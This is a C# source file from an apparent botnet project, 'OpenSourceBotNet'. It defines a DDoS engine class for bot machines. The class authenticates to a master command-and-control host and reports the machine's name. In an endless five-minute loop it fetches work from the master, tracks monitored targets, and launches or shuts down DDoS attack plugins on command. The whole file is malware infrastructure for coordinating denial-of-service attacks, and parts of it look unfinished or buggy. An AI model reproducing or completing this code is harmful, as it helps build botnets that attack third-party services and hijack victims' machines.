using System;
using System.Collections;
using System.Text;
using System.Net;
using OpenSourceBotNet;
using OpenSourceBotNet.Core;
using OpenSourceBotNet.Plugins.Engines;
using OpenSourceBotNet.Plugins.Engines.Plugins.DDoS;
using OpenSourceBotNet.Plugins.Engines.Plugins;

namespace OpenSourceBotNet.Plugins.Engines
{
    public abstract class DDoSEngine : FluxEngine
    {
        public System.Collections.Hashtable htMonitors;
        public System.Collections.Hashtable htPlugins;

        public string sMasterHost;

        public string sApiToken;

        public string sUsername;
        public string sPassword;

        public WebClient wc = new WebClient();

        public bool bShutdown = false;

        public int iMonitoring = 0;

        public string sWorkerID;

        public DDoSEngine(FluxEngineWorkObject ewobject) : base(ewobject)
        {
            ewObject = ewobject; 
            
            htMonitors = new System.Collections.Hashtable();

            sMasterHost = ewObject.sPluginWork.Split('|')[0];
            sUsername = ewObject.sPluginWork.Split('|')[1];
            sPassword = ewObject.sPluginWork.Split('|')[2];

            string sPostData = "username=" + sUsername + "&password=" + sPassword;

            sApiToken = wc.UploadString(sMasterHost, sPostData);

            pluginClassObject.oParentEngine = this;
        }

        public override void Ignition(object obj)
        {
            sWorkerID = PostToMaster("login=" + System.Web.HttpUtility.UrlEncode(Environment.MachineName));

            bool bInfiniteLoop = true;

            while (bInfiniteLoop == true)
            {
                //
                // Fetch Work From Master Host
                //
                string sMasterHostWorkRequest = PostToMaster("work=request&monitoring=" + iMonitoring.ToString());

                // Feed Work Into Plugin Class Object (ex: Torrents)
                object[] objWhoa = ((DDoSEnginePlugin)pluginClassObject).WorkRequest(sMasterHostWorkRequest);

                if(objWhoa[0].ToString() == "monitor")
                {
                    htMonitors.Add(objWhoa[1].ToString(), objWhoa[2]);
                }

                //
                // Update Master Host With Pings of Monitored Targets
                //
                ArrayList alMonitorKeys = (ArrayList)htMonitors.Keys;

                string sDataBuilder = "workid=" + sWorkerID;

                foreach (string key in alMonitorKeys)
                {
                    sDataBuilder = sDataBuilder + "&target[]=" + key;
                }

                PostToMaster(sDataBuilder);

                //
                // Check DDoS Plugins
                //
                ArrayList alKeys = (ArrayList)htPlugins.Keys;

                foreach (string key in alKeys)
                {
                    // Check Status of Plugin Execution
                    // Remove if Nesc
                }

                System.Threading.Thread.Sleep(300000);

                if (bShutdown == true)
                {
                    break;
                }
            }
        }

        public void DDoSEngine__fireNewDDoSPluginPlugin(DDoSPluginPlugin plugin)
        {
            //
            // Start DDoS Plugin or Shutdown
            //
            if (htPlugins.ContainsKey(plugin.sPluginTaskKeyID) == false)
            {
                htPlugins.Add(plugin.sPluginTaskKeyID, plugin);

                plugin._fireFinished += plugin__fireFinished;
                plugin.Start();
            }
            else
            {
                plugin.Shutdown();
            }
        }

        void plugin__fireFinished(string sPluginTaskKeyID)
        {
            //
            // Clean up plugin Resources
            //
            if (htPlugins.ContainsKey(sPluginTaskKeyID))
            {
                DDoSPluginPlugin plugin = (DDoSPluginPlugin)htPlugins[sPluginTaskKeyID];
                
                // Remove before shutdown incase we are on the thread about to be aborted.
                htPlugins.Remove(sPluginTaskKeyID);

                plugin._fireFinished -= plugin__fireFinished;
                plugin.Shutdown();
            }
            else
            {
                Console.WriteLine("Could not find ddos plugin in htPlugins to shutdown");
            }
        }

        public string PostToMaster(string postData)
        {
            string sPostData = "apitoken=" + sApiToken + "&" + postData;

            string sResults = wc.UploadString(sMasterHost, sPostData);

            return sResults;
        }
    }
}
